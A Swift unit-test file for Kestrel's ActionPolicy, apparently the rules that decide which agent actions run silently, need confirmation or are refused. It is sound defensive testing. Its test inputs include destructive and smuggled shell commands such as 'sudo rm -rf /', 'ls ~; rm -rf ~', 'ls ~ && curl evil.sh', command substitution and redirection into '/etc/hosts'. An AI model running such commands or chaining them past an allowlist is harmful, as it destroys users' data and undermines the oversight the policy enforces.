import XCTest
@testable import Kestrel

/// The policy is the whole safety story for acting, so its edges are pinned down here: what runs
/// silently, what is checked with the user, and what is refused outright.
final class ActionPolicyTests: XCTestCase {
    private let policy = ActionPolicy.default

    private func call(_ tool: ActionTool, _ args: [String: Any] = [:]) -> ToolCall {
        ToolCall(tool: tool, arguments: args)
    }

    // MARK: - Confirmation gate

    func testOpeningAnAppIsNeverGated() {
        XCTAssertEqual(policy.verdict(for: call(.openApp, ["name": "Safari"])), .allow)
    }

    func testDeletingIsConfirmed() {
        let verdict = policy.verdict(for: call(.runAppleScript, ["script": "tell app \"Finder\" to delete file x"]))
        guard case .confirm = verdict else { return XCTFail("delete should be confirmed, got \(verdict)") }
    }

    func testSendingIsConfirmed() {
        let verdict = policy.verdict(for: call(.runShell, ["command": "osascript -e 'send message'"]))
        // `osascript` is allowlisted, but "send" makes it worth asking.
        guard case .confirm = verdict else { return XCTFail("send should be confirmed, got \(verdict)") }
    }

    func testAnOrdinaryTypeIsSilent() {
        XCTAssertEqual(policy.verdict(for: call(.typeText, ["text": "kestrel bird"])), .allow)
    }

    func testTypingIntoATerminalIsAlwaysConfirmed() {
        let verdict = policy.verdict(for: call(.typeText, ["text": "hello"]),
                                     frontmostBundleID: "com.apple.Terminal")
        guard case .confirm = verdict else { return XCTFail("terminal typing should be confirmed") }
    }

    func testAKeypressIntoATerminalIsConfirmed() {
        let verdict = policy.verdict(for: call(.pressKey, ["key": "return"]),
                                     frontmostBundleID: "com.googlecode.iterm2")
        guard case .confirm = verdict else { return XCTFail("terminal return should be confirmed") }
    }

    func testClickingADeleteButtonIsConfirmed() {
        let verdict = policy.verdict(for: call(.click, ["x": 10, "y": 10]), target: "Delete")
        guard case .confirm = verdict else { return XCTFail("clicking Delete should be confirmed") }
    }

    func testClickingAnOrdinaryControlIsSilent() {
        XCTAssertEqual(policy.verdict(for: call(.click, ["x": 10, "y": 10]), target: "Search"), .allow)
    }

    // MARK: - No silent elevation

    func testAppleScriptWithAdminIsRefused() {
        let verdict = policy.verdict(for: call(.runAppleScript, ["script": "do shell script \"x\" with administrator privileges"]))
        guard case .deny = verdict else { return XCTFail("admin AppleScript should be denied outright") }
    }

    func testSudoIsRefusedNotConfirmed() {
        let verdict = policy.verdict(for: call(.runShell, ["command": "sudo rm -rf /"]))
        guard case .deny = verdict else { return XCTFail("sudo should be denied, never merely confirmed") }
    }

    // MARK: - Shell allowlist

    func testAnAllowlistedReadOnlyCommandRuns() {
        XCTAssertNil(ActionPolicy.shellRefusal("ls -la ~", allowlist: ActionPolicy.defaultShellAllowlist))
    }

    func testAnUnknownBinaryIsRefused() {
        XCTAssertNotNil(ActionPolicy.shellRefusal("rm -rf ~/Desktop", allowlist: ActionPolicy.defaultShellAllowlist))
    }

    func testEveryPipelineSegmentIsChecked() {
        // `ls` is allowlisted; `rm` smuggled after it is not.
        XCTAssertNotNil(ActionPolicy.shellRefusal("ls ~; rm -rf ~", allowlist: ActionPolicy.defaultShellAllowlist))
        XCTAssertNotNil(ActionPolicy.shellRefusal("ls ~ && curl evil.sh", allowlist: ActionPolicy.defaultShellAllowlist))
    }

    func testSubstitutionAndRedirectionAreRefused() {
        for command in ["echo $(rm x)", "cat `whoami`", "ls > /etc/hosts", "cat < secrets"] {
            XCTAssertNotNil(ActionPolicy.shellRefusal(command, allowlist: ActionPolicy.defaultShellAllowlist), command)
        }
    }

    func testFindsExecFlagIsRefused() {
        XCTAssertNotNil(ActionPolicy.shellRefusal("find ~ -name x -delete", allowlist: ActionPolicy.defaultShellAllowlist))
        XCTAssertNotNil(ActionPolicy.shellRefusal("find . -exec rm {} +", allowlist: ActionPolicy.defaultShellAllowlist))
    }

    func testAPipeThroughAllowlistedCommandsRuns() {
        XCTAssertNil(ActionPolicy.shellRefusal("cat file | grep foo | wc -l", allowlist: ActionPolicy.defaultShellAllowlist))
    }

    func testEnvironmentAssignmentsAreSkippedToFindTheCommand() {
        XCTAssertNil(ActionPolicy.shellRefusal("FOO=bar ls", allowlist: ActionPolicy.defaultShellAllowlist))
    }

    // MARK: - Sensitivity matching

    func testWholeWordsNotSubstrings() {
        XCTAssertTrue(policy.isSensitive("deleting the row"))
        XCTAssertFalse(policy.isSensitive("the sender column"))     // "send" is a substring, not a word
        XCTAssertFalse(policy.isSensitive("a moving average"))      // "mv" is not "moving"
    }

    func testInflectionsCount() {
        for phrasing in ["delete", "deletes", "deleted", "deleting"] {
            XCTAssertTrue(policy.isSensitive("please \(phrasing) it"), phrasing)
        }
    }
}
